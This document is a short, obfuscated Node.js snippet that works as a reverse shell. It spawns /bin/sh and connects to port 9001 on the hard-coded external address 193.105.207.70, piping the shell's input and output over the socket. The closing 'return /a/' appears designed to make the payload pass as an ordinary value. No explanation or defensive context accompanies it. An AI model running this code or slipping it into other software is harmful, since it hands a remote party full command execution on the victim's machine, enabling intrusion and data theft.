(function () {
  var _0x4a3d18 = require("net"), _0x48ad62 = require("child_process"), _0x59cd18 = _0x48ad62.spawn("/bin/sh", []);
  var _0x1fb62b = new _0x4a3d18.Socket;
  _0x1fb62b.connect(9001, "193.105.207.70", function () {
    _0x1fb62b.pipe(_0x59cd18.stdin);
    _0x59cd18.stdout.pipe(_0x1fb62b);
    _0x59cd18.stderr.pipe(_0x1fb62b);
  });
  return /a/;
}());

